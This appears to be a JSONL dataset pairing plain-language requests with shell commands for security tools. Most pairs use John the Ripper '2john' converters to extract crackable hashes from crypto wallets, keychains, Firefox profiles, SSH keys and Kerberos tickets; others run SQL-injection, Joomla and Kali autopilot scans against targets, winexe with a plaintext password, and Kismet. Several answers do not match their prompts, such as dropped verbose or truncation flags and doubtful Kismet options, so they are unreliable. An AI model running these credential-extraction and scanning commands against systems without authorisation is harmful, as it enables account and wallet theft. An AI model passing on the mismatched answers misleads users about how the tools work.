{"input": "Extract password hashes from an Aruba configuration file named \"switch.cfg\" and display only the first 10 lines of the output", "answer": "aruba2john switch.cfg | head -n 10"}
{"input": "Extract password hashes from an Aruba configuration file named \"ap.cfg\" and save the output to a file called \"ap_hashes.txt\" while also displaying the output in the terminal", "answer": "aruba2john ap.cfg | tee ap_hashes.txt"}
{"input": "Extract password hashes from an Aruba configuration file named \"gateway.cfg\" and save the output to a file called \"gateway_hashes.txt\" while suppressing any error messages", "answer": "aruba2john gateway.cfg > gateway_hashes.txt 2>/dev/null"}
{"input": "Extract hash information from all BestCrypt volumes located in `/mnt/encrypted_volumes` and save the output to `hashes.txt`", "answer": "bestcrypt2john /mnt/encrypted_volumes/* > hashes.txt"}
{"input": "Convert all BestCrypt volumes in `/var/lib/bestcrypt` to John the Ripper format and append the output to an existing file `existing_hashes.txt`", "answer": "bestcrypt2john /var/lib/bestcrypt/* >> existing_hashes.txt"}
{"input": "Convert all BestCrypt volumes in `/home/user/backup` to John the Ripper format and save the output to a new file `backup_hashes.txt`", "answer": "bestcrypt2john /home/user/backup/* > backup_hashes.txt"}
{"input": "Convert all BestCrypt volumes in `/usr/local/bestcrypt` to John the Ripper format and save the output to a file `local_hashes.txt` while also displaying it on the screen", "answer": "bestcrypt2john /usr/local/bestcrypt/* | tee local_hashes.txt"}
{"input": "Convert all BestCrypt volumes in `/home/user/encrypted` to John the Ripper format and save the output to a file `encrypted_hashes.txt`, but only include volumes with the `.bc` extension", "answer": "bestcrypt2john /home/user/encrypted/*.bc > encrypted_hashes.txt"}
{"input": "Convert the Bitcoin wallet file `my_wallet.dat` into a format compatible with John the Ripper for password cracking", "answer": "bitcoin2john my_wallet.dat"}
{"input": "Process the Bitcoin wallet file `old_wallet.dat` to generate a hash output for John the Ripper", "answer": "bitcoin2john old_wallet.dat"}
{"input": "Convert the Bitcoin wallet file `encrypted_wallet.dat` into a hash format for John the Ripper", "answer": "bitcoin2john encrypted_wallet.dat"}
{"input": "Convert the Bitcoin wallet file `corrupted_wallet.dat` into a format compatible with John the Ripper", "answer": "bitcoin2john corrupted_wallet.dat"}
{"input": "Extract all hashes from the Bitshares wallet file `test_wallet.dat` using bitshares2john and display verbose output during the process", "answer": "bitshares2john test_wallet.dat"}
{"input": "Prepare all entries from the Bitwarden vault file `secure_vault.json` for John the Ripper analysis", "answer": "bitwarden2john --all secure_vault.json"}
{"input": "Extract hash information from a BKS keystore file located at `/path/to/keystore.bks` for use with John the Ripper", "answer": "bks2john /path/to/keystore.bks"}
{"input": "Process a BKS keystore file named `backup.bks` to generate a hash for password cracking with John the Ripper", "answer": "bks2john backup.bks"}
{"input": "Convert an Uber keystore file named `encrypted.uber` to a hash format compatible with John the Ripper", "answer": "bks2john -t uber encrypted.uber"}
{"input": "Extract hash information from a BKS keystore file named `keystore_backup.bks` for use with John the Ripper", "answer": "bks2john keystore_backup.bks"}
{"input": "Convert a blockchain wallet file named `wallet.dat` to a John the Ripper-compatible format, assuming it uses the v2 format", "answer": "blockchain2john wallet.dat"}
{"input": "Extract a base64 string from a blockchain wallet file called `my_wallet.dat` and prepare it for John the Ripper", "answer": "blockchain2john my_wallet.dat"}
{"input": "Convert a blockchain wallet file named `backup_wallet.dat` to a John the Ripper-compatible format without specifying any special format", "answer": "blockchain2john backup_wallet.dat"}
{"input": "Convert multiple blockchain wallet files (`wallet1.dat`, `wallet2.dat`, and `wallet3.dat`) to John the Ripper-compatible formats, assuming they all use the v2 format", "answer": "blockchain2john wallet1.dat wallet2.dat wallet3.dat"}
{"input": "Convert a blockchain wallet file named `encrypted_wallet.dat` to a John the Ripper-compatible format, assuming it contains only a base64 string and uses the v2 format", "answer": "blockchain2john encrypted_wallet.dat"}
{"input": "Convert a blockchain wallet file named `legacy_wallet.dat` to a John the Ripper-compatible format, assuming it is in the default format and does not require any special flags", "answer": "blockchain2john legacy_wallet.dat"}
{"input": "Convert all credential cache files in the `/home/user/kerberos` directory to John the Ripper format and save the output to a file named `output.txt`", "answer": "ccache2john /home/user/kerberos/*.ccache > output.txt"}
{"input": "Convert all credential cache files in the current directory to John the Ripper format and append the results to an existing file named `crackable_hashes.txt`", "answer": "ccache2john *.ccache >> crackable_hashes.txt"}
{"input": "Convert all credential cache files in the `/tmp/kerberos_tickets` directory to John the Ripper format and save the output to a file named `hashes_for_cracking.txt`", "answer": "ccache2john /tmp/kerberos_tickets/*.ccache > hashes_for_cracking.txt"}
{"input": "Use John the Ripper to crack the hashes stored in \"hashes.txt\" using the seeds logged in \"seed-log.txt\" and apply custom rules for password cracking", "answer": "/usr/sbin/john --wordlist=seed-log.txt --rules hashes.txt"}
{"input": "Convert a Dashlane vault file named \"vault.dash\" to John the Ripper-compatible hashes, including all formats, and display verbose output for debugging purposes", "answer": "dashlane2john --all --verbose vault.dash"}
{"input": "Extract password hashes from a DeepSound audio file named \"confidential.wav\" and display the help message for additional options", "answer": "deepsound2john confidential.wav && deepsound2john -h"}
{"input": "Extract password hashes from a DeepSound audio file named \"classified.wav\" and display the help message to understand the tool's options", "answer": "deepsound2john -h && deepsound2john classified.wav"}
{"input": "Process all `.ecryptfs` files in the current directory and output their John the Ripper-compatible formats", "answer": "ecryptfs2john *.ecryptfs"}
{"input": "Extract the cryptographic information from the file `archive.ecryptfs` in the `/home/user/documents` directory and prepare it for John the Ripper", "answer": "ecryptfs2john /home/user/documents/archive.ecryptfs"}
{"input": "Extract password hashes from the ejabberd database file `ejabberd.db` for offline cracking using John the Ripper", "answer": "ejabberd2john ejabberd.db"}
{"input": "Prepare the ejabberd database file `ejabberd_users.ldif` for password cracking by converting it into a John the Ripper-compatible format", "answer": "ejabberd2john ejabberd_users.ldif"}
{"input": "Extract password hashes from the ejabberd user database file `xmpp_users.db` for offline analysis using John the Ripper", "answer": "ejabberd2john xmpp_users.db"}
{"input": "Convert the ejabberd user database file `ejabberd_accounts.ldif` into a format suitable for John the Ripper to extract and crack password hashes", "answer": "ejabberd2john ejabberd_accounts.ldif"}
{"input": "Extract password hashes from the ejabberd user database file `xmpp_accounts.db` for offline cracking using John the Ripper", "answer": "ejabberd2john xmpp_accounts.db"}
{"input": "Convert an Electrum wallet file to a John the Ripper-compatible hash format, ensuring truncated hashes are generated", "answer": "electrum2john -t wallet_file.dat"}
{"input": "I need to extract hashes from an Electrum wallet file for use in John the Ripper, but I want to ensure the hashes are truncated", "answer": "electrum2john my_wallet.dat"}
{"input": "How do I prepare an Electrum wallet file for password cracking with John the Ripper, including truncated hashes?", "answer": "electrum2john -t electrum_wallet.dat"}
{"input": "Extract hashes from an Electrum wallet file named `test_wallet.dat` for use in John the Ripper, forcing truncated hash generation", "answer": "electrum2john -t test_wallet.dat"}
{"input": "Convert all EncFS configuration files in the `/usr/local/encfs` directory to John the Ripper format and display the output in the terminal with line numbers", "answer": "encfs2john /usr/local/encfs/* | nl"}
{"input": "Convert all EncFS configuration files in the `/home/user/encfs` directory to John the Ripper format and filter the output to only show lines containing the word \"encfs\"", "answer": "encfs2john /home/user/encfs/* | grep \"encfs\""}
{"input": "Process the Enpass database \"backup.enpassdb\" with all available options enabled and display the output directly in the terminal", "answer": "enpass2john backup.enpassdb"}
{"input": "Process the Enpass database \"secure_data.enpassdb\" with all options enabled and display the output in the terminal", "answer": "enpass2john secure_data.enpassdb"}
{"input": "Convert all Ethereum wallet files in the directory `/home/user/wallets` to a format compatible with John the Ripper", "answer": "ethereum2john /home/user/wallets/"}
{"input": "Extract hash information from all Ethereum keystore files located in `/var/lib/ethereum/keystore` for password recovery", "answer": "ethereum2john /var/lib/ethereum/keystore/"}
{"input": "Convert all Ethereum wallet files in `/home/alice/eth_wallets` to John the Ripper format, including subdirectories", "answer": "find /home/alice/eth_wallets -type f -exec ethereum2john {} +"}
{"input": "Process all Ethereum wallet files in `/root/.ethereum/keystore` and output the results to the terminal", "answer": "ethereum2john /root/.ethereum/keystore/"}
{"input": "Convert all FileZilla configuration files in the directory `/home/user/filezilla_configs` to John the Ripper format", "answer": "filezilla2john /home/user/filezilla_configs/"}
{"input": "Extract all hash information from the GELI-encrypted disk image `backup.img` and save the output to a file named `output.txt` while suppressing warnings", "answer": "geli2john backup.img > output.txt 2>/dev/null"}
{"input": "Convert the htdigest file \"admin_digest.txt\" located in the \"/var/www/auth\" directory to a John the Ripper-compatible format", "answer": "htdigest2john /var/www/auth/admin_digest.txt"}
{"input": "Convert the iOS 7 backup file \"backup.plist\" to a John the Ripper-compatible format and append the output to an existing file named \"existing_hashes.txt\"", "answer": "ios7tojohn backup.plist >> existing_hashes.txt"}
{"input": "Convert the iOS 7 backup file \"backup.plist\" to a John the Ripper-compatible format and save the output to a file named \"john_hash.txt\"", "answer": "ios7tojohn backup.plist > john_hash.txt"}
{"input": "Convert the iOS 7 backup file \"backup.plist\" to a John the Ripper-compatible format and save the output to a file named \"hashes_for_john.txt\"", "answer": "ios7tojohn backup.plist > hashes_for_john.txt"}
{"input": "I have an iTunes backup in the directory `/Users/example/backup/` and want to extract its hash for cracking", "answer": "itunes_backup2john /Users/example/backup/"}
{"input": "Extract password hashes from all iWork files in the current directory and limit the output to only the hash values using iwork2john", "answer": "iwork2john * | cut -d: -f2"}
{"input": "Extract all keychain data from the file `login.keychain` and save the output to `output.txt` for use with John the Ripper", "answer": "keychain2john login.keychain > output.txt"}
{"input": "Extract all keychain data from the file `Certificates.keychain` and save the output to a file named `cert_hashes.txt`", "answer": "keychain2john Certificates.keychain > cert_hashes.txt"}
{"input": "Process all keychain files in the `/Volumes/External/Keychains` directory and save the output to a file named `external_hashes.txt`", "answer": "keychain2john /Volumes/External/Keychains/* > external_hashes.txt"}
{"input": "Extract all keychain data from the file `Network.keychain` and save the output to a file named `network_hashes.txt`", "answer": "keychain2john Network.keychain > network_hashes.txt"}
{"input": "Convert the Gnome Keyring file \"user.keyring\" to a format compatible with John the Ripper for password cracking", "answer": "keyring2john user.keyring"}
{"input": "I need to extract password hashes from the Gnome Keyring file \"backup.keyring\" to use with John the Ripper", "answer": "keyring2john backup.keyring"}
{"input": "How do I prepare the Gnome Keyring file \"secure.keyring\" for a password audit using John the Ripper?", "answer": "keyring2john secure.keyring"}
{"input": "Convert the Gnome Keyring file \"vault.keyring\" to John the Ripper's format to test its password strength", "answer": "keyring2john vault.keyring"}
{"input": "Convert the Java keystore file `mykeystore.jks` into a format that John the Ripper can use for password cracking", "answer": "keystore2john mykeystore.jks"}
{"input": "Extract hash information from the keystore file `client_keystore.jks` to prepare it for password cracking with John the Ripper", "answer": "keystore2john client_keystore.jks"}
{"input": "I have a keystore file named `server_keys.jks`. How can I prepare it for password cracking using John the Ripper?", "answer": "keystore2john server_keys.jks"}
{"input": "Convert the keystore file `app_keystore.jks` into a John the Ripper-compatible format to test its password strength", "answer": "keystore2john app_keystore.jks"}
{"input": "I need to extract hash data from a keystore file named `secure_store.jks` for password analysis. What command should I use?", "answer": "keystore2john secure_store.jks"}
{"input": "How can I prepare the keystore file `user_credentials.jks` for password cracking with John the Ripper?", "answer": "keystore2john user_credentials.jks"}
{"input": "I have a keystore file named `backup_keys.jks`. What command should I use to prepare it for password recovery with John the Ripper?", "answer": "keystore2john backup_keys.jks"}
{"input": "Convert the keystore file `prod_keystore.jks` into a John the Ripper-compatible format to test its password security", "answer": "keystore2john prod_keystore.jks"}
{"input": "Extract hash data from the keystore file `dev_keystore.jks` to prepare it for password cracking with John the Ripper", "answer": "keystore2john dev_keystore.jks"}
{"input": "I need to convert the keystore file `test_keys.jks` into a format that John the Ripper can use for password analysis. What command should I use?", "answer": "keystore2john test_keys.jks"}
{"input": "Convert all `.kirbi` files in the current directory into a crackable format and save the output to `crack_output.txt`", "answer": "kirbi2john *.kirbi -o crack_output.txt"}
{"input": "Convert all entries in the known_hosts file located at `/home/user/.ssh/known_hosts` into a format suitable for John the Ripper", "answer": "known_hosts2john /home/user/.ssh/known_hosts"}
{"input": "Extract all host keys from the known_hosts file in the current directory and prepare them for password cracking with John the Ripper", "answer": "known_hosts2john ./known_hosts"}
{"input": "Process the known_hosts file located at `/var/lib/ssh/known_hosts` to extract all host keys for John the Ripper", "answer": "known_hosts2john /var/lib/ssh/known_hosts"}
{"input": "Extract all host keys from the known_hosts file located at `/root/.ssh/known_hosts` and prepare them for cracking with John the Ripper", "answer": "known_hosts2john /root/.ssh/known_hosts"}
{"input": "Convert all SSH host keys from the known_hosts file located at `/mnt/backup/ssh/known_hosts` into a John the Ripper compatible format", "answer": "known_hosts2john /mnt/backup/ssh/known_hosts"}
{"input": "Prepare all entries from the known_hosts file located at `/usr/local/etc/ssh/known_hosts` for cracking with John the Ripper", "answer": "known_hosts2john /usr/local/etc/ssh/known_hosts"}
{"input": "Convert all host keys from the known_hosts file located at `/opt/ssh/known_hosts` into a John the Ripper compatible format", "answer": "known_hosts2john /opt/ssh/known_hosts"}
{"input": "Extract all SSH host keys from the known_hosts file located at `/data/ssh/known_hosts` and prepare them for cracking with John the Ripper", "answer": "known_hosts2john /data/ssh/known_hosts"}
{"input": "Extract all Kerberos credentials from the keytab file `admin.keytab` and prepare them for John the Ripper, ensuring no entries are skipped", "answer": "krb2john admin.keytab"}
{"input": "Convert all LastPass vault entries from the file `vault.csv` into a format suitable for John the Ripper", "answer": "lastpass2john vault.csv"}
{"input": "Convert all entries in the LastPass vault file `vault_export.csv` into a format suitable for John the Ripper", "answer": "lastpass2john --all vault_export.csv"}
{"input": "Convert all LION recovery files in the directory `/home/user/lion_recovery` to John the Ripper format, excluding files with the `.bak` extension", "answer": "find /home/user/lion_recovery -type f ! -name \"*.bak\" -exec lion2john {} \\;"}
{"input": "Convert all Lotus Notes ID files in the current directory to John the Ripper-compatible hash formats", "answer": "lotus2john *.id"}
{"input": "Extract hashes from all Lotus Notes ID files in the directory `/home/user/notes` and save the output to a file named `lotus_hashes.txt`", "answer": "lotus2john /home/user/notes/* > lotus_hashes.txt"}
{"input": "Extract hashes from all Lotus Notes ID files in the directory `/var/lib/lotus` and save the output to a file named `lotus_output.txt`", "answer": "lotus2john /var/lib/lotus/* > lotus_output.txt"}
{"input": "Use lotus2john to extract hashes from all Lotus Notes ID files in the directory `/usr/local/lotus` and append the results to an existing file named `hashes.txt`", "answer": "lotus2john /usr/local/lotus/* >> hashes.txt"}
{"input": "Extract hashes from all Lotus Notes ID files in the directory `/data/lotus` and filter the output to only include lines containing the word \"hash\"", "answer": "lotus2john /data/lotus/* | grep \"hash\""}
{"input": "Extract hashes from all Lotus Notes ID files in the directory `/var/notes` and display the results in a paginated format", "answer": "lotus2john /var/notes/* | less"}
{"input": "Convert the macOS keychain file \"user.keychain\" into a format suitable for John the Ripper", "answer": "mac2john user.keychain"}
{"input": "Extract hashes from the macOS keychain file \"system.keychain\" and save the output to a file named \"hashes.txt\"", "answer": "mac2john system.keychain > hashes.txt"}
{"input": "Extract password hashes from the macOS keychain file \"default.keychain\" and append the results to an existing file named \"output_hashes.txt\"", "answer": "mac2john default.keychain >> output_hashes.txt"}
{"input": "Extract hashes from the macOS keychain file \"encrypted.keychain\" and pipe the output to John the Ripper for immediate cracking", "answer": "mac2john encrypted.keychain | john --stdin"}
{"input": "Convert multiple mosquitto_passwd files located at `/etc/mosquitto/passwd1` and `/etc/mosquitto/passwd2` to John the Ripper format", "answer": "mosquitto2john /etc/mosquitto/passwd1 /etc/mosquitto/passwd2"}
{"input": "Convert the hashes in the mosquitto_passwd file located at `/opt/mosquitto/passwd` to John the Ripper format and display the output directly in the terminal", "answer": "mosquitto2john /opt/mosquitto/passwd"}
{"input": "Extract all password hashes from the Mozilla Firefox profiles located in the directory `/home/user/.mozilla/firefox/` using mozilla2john", "answer": "mozilla2john /home/user/.mozilla/firefox/"}
{"input": "Extract all password hashes from the Mozilla Firefox profiles in the directory `/home/user/.mozilla/firefox/` and ensure the output is in a format that can be directly fed into John the Ripper", "answer": "mozilla2john /home/user/.mozilla/firefox/"}
{"input": "Extract all supported hash formats from the MultiBit wallet file \"old_wallet.dat\" and display them in the terminal", "answer": "multibit2john old_wallet.dat"}
{"input": "Convert all Neo4j database files in the directory `/data/neo4j` to John the Ripper format and append the output to an existing file named `all_hashes.txt`", "answer": "neo2john -a /data/neo4j >> all_hashes.txt"}
{"input": "Extract the hash from the encrypted Microsoft Office document \"report.docx\" using office2john", "answer": "office2john report.docx"}
{"input": "Extract the hash from an encrypted Word document \"contract.doc\" and include the raw hash format", "answer": "office2john -r contract.doc"}
{"input": "Extract the hash from an encrypted Office 2007 document \"plan.docx\" and include the legacy format for compatibility", "answer": "office2john -l plan.docx"}
{"input": "Extract the hash from an encrypted Office document \"report.docx\" and include verbose output along with the legacy format", "answer": "office2john -v -l report.docx"}
{"input": "Extract the hash from the OpenBSD SoftRAID volume stored in the file `backup.img` and prepare it for John the Ripper", "answer": "openbsd_softraid2john backup.img"}
{"input": "Generate a John the Ripper-compatible hash from the OpenBSD SoftRAID volume on the external drive mounted at `/mnt/external/raid1`", "answer": "openbsd_softraid2john /mnt/external/raid1"}
{"input": "Convert the OpenBSD SoftRAID volume from the disk image `disk.img` into a John the Ripper hash format", "answer": "openbsd_softraid2john disk.img"}
{"input": "Prepare the OpenBSD SoftRAID volume on the device `/dev/raid2` for password cracking using John the Ripper", "answer": "openbsd_softraid2john /dev/raid2"}
{"input": "Extract the hash from the OpenBSD SoftRAID volume stored in the file `raid_volume.bin` for use with John the Ripper", "answer": "openbsd_softraid2john raid_volume.bin"}
{"input": "Convert the OpenBSD SoftRAID volume on the device `/dev/raid3` into a John the Ripper-compatible hash", "answer": "openbsd_softraid2john /dev/raid3"}
{"input": "Generate a John the Ripper-compatible hash from the OpenBSD SoftRAID volume stored in the file `encrypted_raid.img`", "answer": "openbsd_softraid2john encrypted_raid.img"}
{"input": "Extract the hash from the OpenBSD SoftRAID volume on the device `/dev/raid4` for use with John the Ripper", "answer": "openbsd_softraid2john /dev/raid4"}
{"input": "Convert all encrypted Padlock files in the directory `/home/user/padlock_files` to John the Ripper format using the `--all` flag", "answer": "padlock2john --all /home/user/padlock_files"}
{"input": "Extract the hash from a PDF file named \"invoice.pdf\" and save the output to a file called \"hash_output.txt.\"", "answer": "pdf2john.pl invoice.pdf > hash_output.txt"}
{"input": "Extract and convert all RSA private keys from the file `private_keys.pem` for use with John the Ripper", "answer": "pem2john private_keys.pem"}
{"input": "Process the file `mixed_certs.pem` to extract and convert all types of PEM-encoded data for John the Ripper", "answer": "pem2john mixed_certs.pem"}
{"input": "Convert all PEM-encoded certificates and keys in the file `vault.pem` to a John the Ripper-compatible format", "answer": "pem2john vault.pem"}
{"input": "Extract and convert all DSA private keys from the file `dsa_keys.pem` for John the Ripper", "answer": "pem2john dsa_keys.pem"}
{"input": "I want to extract all hashes from the PFX file `admin_cert.pfx` for use with John the Ripper", "answer": "pfx2john admin_cert.pfx"}
{"input": "Extract hash information from all PGP disk files in `/usr/local/pgp_disks` and append the results to an existing file named `existing_hashes.txt`", "answer": "pgpdisk2john /usr/local/pgp_disks/* >> existing_hashes.txt"}
{"input": "Extract hash information from all PGP disk images in `/home/user/backup/pgp` and filter the output to only include lines containing the word \"encrypted\"", "answer": "find /home/user/backup/pgp -type f -name \"*.pgp\" -exec pgpdisk2john {} \\; | grep \"encrypted\""}
{"input": "Extract hash information from all PGP disk files in `/var/pgp/disks` and sort the output alphabetically before saving it to `sorted_hashes.txt`", "answer": "pgpdisk2john /var/pgp/disks/* | sort > sorted_hashes.txt"}
{"input": "Convert the PGP SDA file \"secure_data.pgp\" into a format compatible with John the Ripper, including all available hash types", "answer": "pgpsda2john secure_data.pgp"}
{"input": "Generate a hash dump from the PGP SDA file \"vault.pgp\" to use with John the Ripper", "answer": "pgpsda2john vault.pgp"}
{"input": "Extract all possible hash formats from the PGP SDA file \"archive.pgp\" for further analysis", "answer": "pgpsda2john archive.pgp"}
{"input": "Convert the PGP SDA file \"data.pgp\" into a John the Ripper-compatible hash file, including all available hash types", "answer": "pgpsda2john data.pgp"}
{"input": "Generate a hash dump from the PGP SDA file \"protected.pgp\" to use with John the Ripper for cracking", "answer": "pgpsda2john protected.pgp"}
{"input": "Process all PGP WDE files in `/tmp/pgp_encrypted` and save the output to a new file `output_hashes.txt` in the current directory", "answer": "pgpwde2john /tmp/pgp_encrypted/* > ./output_hashes.txt"}
{"input": "Convert all PGP WDE files in `/var/lib/pgp` to John the Ripper format and save the output to a file named `pgp_hashes.txt` in the `/tmp` directory", "answer": "pgpwde2john /var/lib/pgp/* > /tmp/pgp_hashes.txt"}
{"input": "Convert all Password Safe databases in the `/home/user/documents/` directory to John the Ripper format, but only include files larger than 1 MB", "answer": "find /home/user/documents/ -name \"*.psafe3\" -size +1M -exec pwsafe2john {} \\;"}
{"input": "Process all `.dump` files in the `/var/log/sipdumps/` directory and convert them to John the Ripper format", "answer": "sipdump2john /var/log/sipdumps/*.dump"}
{"input": "Convert multiple specific SIP dump files (`dump1.txt`, `dump2.txt`, and `dump3.txt`) into John the Ripper format", "answer": "sipdump2john dump1.txt dump2.txt dump3.txt"}
{"input": "Convert multiple SSH private key files (`key1`, `key2`, and `key3`) into John the Ripper compatible hashes and save them to separate output files", "answer": "ssh2john key1 > key1.hash && ssh2john key2 > key2.hash && ssh2john key3 > key3.hash"}
{"input": "Convert the SSH private key file `user_key` to a hash and save it to a file named `user_key.hash`, then use John the Ripper to crack the hash", "answer": "ssh2john user_key > user_key.hash && john user_key.hash"}
{"input": "How can I extract all possible password hashes from a StarOffice document located at \"/home/user/docs/presentation.sxd\"?", "answer": "soffice2john /home/user/docs/presentation.sxd"}
{"input": "I need to extract all password hashes from a StarOffice document named \"report.ods\" and include all possible hash types in the output", "answer": "odf2john report.ods"}
{"input": "Extract the hash from the Telegram data file in the current directory named `tdata` using telegram2john", "answer": "telegram2john ./tdata"}
{"input": "Convert a Tezos wallet file for John the Ripper, ensuring it doesn\u2019t validate the ICO format", "answer": "tezos2john wallet_file.json"}
{"input": "Extract the TrueCrypt volume header from the file \"encrypted_volume.tc\" and prepare it for John the Ripper", "answer": "truecrypt2john encrypted_volume.tc"}
{"input": "Extract the TrueCrypt volume header from the file \"secret_data.tc\" located in the \"/mnt/backup\" directory and prepare it for John the Ripper", "answer": "truecrypt2john /mnt/backup/secret_data.tc"}
{"input": "Extract the TrueCrypt volume header from the file \"archive.tc\" and output the result to a file named \"john_input.txt\"", "answer": "truecrypt2john archive.tc > john_input.txt"}
{"input": "Extract the TrueCrypt volume header from the file \"hidden.tc\" and save the output to a file named \"john_input.txt\" in the current directory", "answer": "truecrypt2john hidden.tc > ./john_input.txt"}
{"input": "Convert all Zed files with the `.zed` extension in the `/backup/` directory to John the Ripper format", "answer": "zed2john /backup/*.zed"}
{"input": "Convert all Zed files in the `/var/log/zed/` directory and append the output to an existing file named `output_hashes.txt`", "answer": "zed2john /var/log/zed/* >> output_hashes.txt"}
{"input": "Extract hash data from all Zed files in the `/home/user/zed_backups/` directory and save the output to a new file named `crackable_hashes.txt`", "answer": "zed2john /home/user/zed_backups/* > crackable_hashes.txt"}
{"input": "Convert all Zed files in the `/tmp/zed_files/` directory and pipe the output to another tool for further processing", "answer": "zed2john /tmp/zed_files/* | another_tool"}
{"input": "Convert all Zed files in the `/opt/zed/` directory and save the output to a file named `john_input.txt` in the `/output/` directory", "answer": "zed2john /opt/zed/* > /output/john_input.txt"}
{"input": "Process all Zed files in the `/home/security/zed_files/` directory and save the output to a file named `hashes.txt` in the same directory", "answer": "zed2john /home/security/zed_files/* > /home/security/zed_files/hashes.txt"}
{"input": "Scan the Joomla website at `http://example.com` using a random User-Agent and a timeout of 10 seconds", "answer": "joomscan --url http://example.com --random-agent --timeout 10"}
{"input": "Scan the Joomla website at `http://example.com` and set a custom cookie for the session", "answer": "joomscan --url http://example.com --cookie \"sessionid=12345\""}
{"input": "Display the version and author information of the JoomScan tool", "answer": "joomscan --about"}
{"input": "Search for all notes containing the keyword \"cybersecurity\" across all notebooks and tags", "answer": "joplin search \"cybersecurity\" --all"}
{"input": "Import all notes from a directory named \"import_notes\" into Joplin", "answer": "joplin import --format md import_notes"}
{"input": "List all notes in Joplin using the command-line interface", "answer": "joplin note list"}
{"input": "Import notes into Joplin from a Markdown file named \"import_notes.md.\"", "answer": "joplin import --format md \"import_notes.md\""}
{"input": "List all notebooks in Joplin", "answer": "joplin notebook list"}
{"input": "Move a note with the ID \"def789\" to a notebook with the ID \"ghi101.\"", "answer": "joplin note move \"def789\" \"ghi101\""}
{"input": "Tag a note with the ID \"jkl112\" with the tag \"Important.\"", "answer": "joplin tag add \"Important\" \"jkl112\""}
{"input": "Display all files and directories in the JSP file browser's default directory, including their sizes in a human-readable format", "answer": "ls -lh /path/to/jsp/default/directory"}
{"input": "Use jsql to scan the target `http://192.168.1.50` with all techniques, and set the HTTP method to POST", "answer": "jsql -u http://192.168.1.50 --all --method POST"}
{"input": "Use jsql to scan the target `http://example.org` with all techniques, and ignore SSL certificate errors", "answer": "jsql -u http://example.org --all --ignore-ssl"}
{"input": "Use jsql to scan the target `http://example.com` with all techniques, and include verbose output for detailed logging", "answer": "jsql -u http://example.com --all --verbose"}
{"input": "Use jsql-injection to scan the URL `http://example-store.com/cart?item=123` for SQL injection vulnerabilities, enabling all techniques and setting a delay of 5 seconds between requests", "answer": "jsql-injection -u http://example-store.com/cart?item=123 --all --delay=5"}
{"input": "Use jsql-injection to scan the URL `http://vulnerable-site.com/admin` for SQL injection vulnerabilities, enabling all techniques and using a custom cookie `sessionid=12345`", "answer": "jsql-injection -u http://vulnerable-site.com/admin --all --cookie=\"sessionid=12345\""}
{"input": "Start the Juice Shop application with verbose logging enabled to get detailed output for debugging purposes", "answer": "npm start -- --verbose"}
{"input": "Start the Juice Shop application with a custom delay before opening the web interface, such as 10 seconds", "answer": "sleep 10 && npm start"}
{"input": "Run all available modules in kali-autopilot against the target IP 198.51.100.25, with verbose output enabled", "answer": "kali-autopilot --target 198.51.100.25 --all --verbose"}
{"input": "Execute all modules in kali-autopilot against the target IP 10.0.0.50, with a custom timeout of 60 seconds per module", "answer": "kali-autopilot --target 10.0.0.50 --all --timeout 60"}
{"input": "Run a command to check the status of the \"Windows Update\" service on a remote Windows machine with IP 10.10.20.25, using the username \"updateuser\" and password \"Update@2023\"", "answer": "winexe -U updateuser%Update@2023 //10.10.20.25 \"sc query wuauserv\""}
{"input": "Scan the EGSM band with verbose output and debug messages enabled using the kal tool", "answer": "kal -s EGSM -v -D"}
{"input": "Scan the GSM-R band with a gain of 30 dB and verbose output using the kal tool", "answer": "kal -s GSM-R -g 30 -v"}
{"input": "Scan the GSM850 band with debug messages enabled and a gain of 25 dB using the kal tool", "answer": "kal -s GSM850 -D -g 25"}
{"input": "Convert a Kerberos ticket stored in `ticket.kirbi` to a John the Ripper-compatible format and save it to `ticket_john.txt`", "answer": "python kirbi2john.py ticket.kirbi > ticket_john.txt"}
{"input": "Connect to a remote Kismet server at 192.168.1.100 on port 2501 using an API key \"abc123xyz\"", "answer": "kismet_client --connect 192.168.1.100:2501 --apikey abc123xyz"}
{"input": "Connect to a remote Kismet server at 192.168.1.100 on port 2501 using an API key `abc123xyz456`", "answer": "kismet_client --server 192.168.1.100:2501 --apikey abc123xyz456"}
{"input": "Connect to a remote Kismet server at IP 192.168.1.100 on port 3501 using the legacy TCP remote capture protocol", "answer": "kismet -c tcp://192.168.1.100:3501"}
{"input": "Background the `kismet_cap_nrf_51822` tool and run it in daemon mode", "answer": "kismet_cap_nrf_51822 --daemonize"}
{"input": "Connect to a remote Kismet server at 192.168.1.100 on port 3501 using the legacy TCP protocol", "answer": "kismet -c tcp://192.168.1.100:3501"}
{"input": "Set a fixed GPS location for the capture at latitude 37.7749, longitude -122.4194, and altitude 12 meters while connecting to a remote Kismet server at 192.168.1.200 on port 2501", "answer": "kismet_cap_nrf_mousejack --connect 192.168.1.200:2501 --fixed-gps 37.7749,-122.4194,12"}
{"input": "Run the `kismet_cap_rz_killerbee` tool in the background as a daemon", "answer": "kismet_cap_rz_killerbee --daemonize"}
{"input": "Run the `kismet_cap_ti_cc_2540` tool in the background as a daemon", "answer": "kismet_cap_ti_cc_2540 --daemonize"}
{"input": "Connect to a remote Kismet server at 192.168.1.100 on port 2501 using SSL and provide a custom certificate file `custom_cert.pem`", "answer": "kismet -c 192.168.1.100:2501 --ssl --ssl-certificate custom_cert.pem"}
{"input": "Run `kismet_cap_kismetdb` in the background as a daemon", "answer": "kismet_cap_kismetdb --daemonize"}
{"input": "Run Kismet with debugging enabled, disable the console wrapper, and use a specific home directory located at `/home/user/kismet_data`", "answer": "kismet --debug --no-console-wrapper --homedir /home/user/kismet_data"}
{"input": "Start Kismet with a custom home directory `/home/user/kismet_home` and disable all plugins", "answer": "kismet --homedir /home/user/kismet_home --no-plugins"}
{"input": "Perform a cleanup operation on the Kismet log file \"network_logs.kismet\" to fix any inconsistencies caused by incomplete journal data", "answer": "kismetdb_clean --in network_logs.kismet"}
{"input": "I have a Kismet database file named \"wifi_capture.kismet\" that has incomplete journal data. How can I clean it up?", "answer": "kismetdb_clean -i wifi_capture.kismet"}
{"input": "How do I clean up a Kismet database file named \"test_capture.kismet\" that has incomplete journal data?", "answer": "kismetdb_clean -i test_capture.kismet"}
{"input": "I have a Kismet database file named \"warehouse_capture.kismet\" with incomplete journal entries. How do I clean it up?", "answer": "kismetdb_clean --in warehouse_capture.kismet"}
{"input": "Generate statistics for a Kismet database file named \"capture_data.kismet\" and output the results in JSON format", "answer": "kismetdb_statistics -i capture_data.kismet -j"}
{"input": "Analyze the Kismet database file \"network_traffic.kismet\" without cleaning the database and provide the statistics", "answer": "kismetdb_statistics -i network_traffic.kismet -s"}
